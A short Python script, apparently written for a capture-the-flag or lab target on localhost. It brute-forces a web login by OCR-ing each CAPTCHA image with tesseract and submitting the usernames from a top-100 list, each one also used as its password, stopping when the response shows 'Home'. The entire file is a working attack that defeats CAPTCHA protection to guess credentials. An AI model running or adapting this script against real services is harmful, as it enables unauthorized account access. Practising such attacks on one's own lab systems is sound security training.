import requests as req
import subprocess


def getCaptcha(session):
	
	res = session.get("http://localhost:4447/captcha")
	file  = open("captcha.jpeg","wb")
	file.write(res.content)
	file.close()
	subprocess.run(["tesseract","./captcha.jpeg","./test"])
	file  = open("./test.txt","r")
	captchaString = file.read()
	file.close()
	print(captchaString.strip())
	return captchaString.strip()
	



def login():
	file  = open("./top100usernames.txt","r")
	for userName in file.readlines():
		session = req.Session()
		captcha = getCaptcha(session)
		#userName="ARCHIVIST"
		data = {'userName':userName.strip(),'password':userName.strip(),'captcha':captcha}
		res = session.post("http://localhost:4447/submit",data)
		serverResponse = res.text
        #print(serverResponse)
        #print("Home" in serverResponse)
		if("Home" in serverResponse):
			print("Got the Creds")
			print(userName)
			break

login()
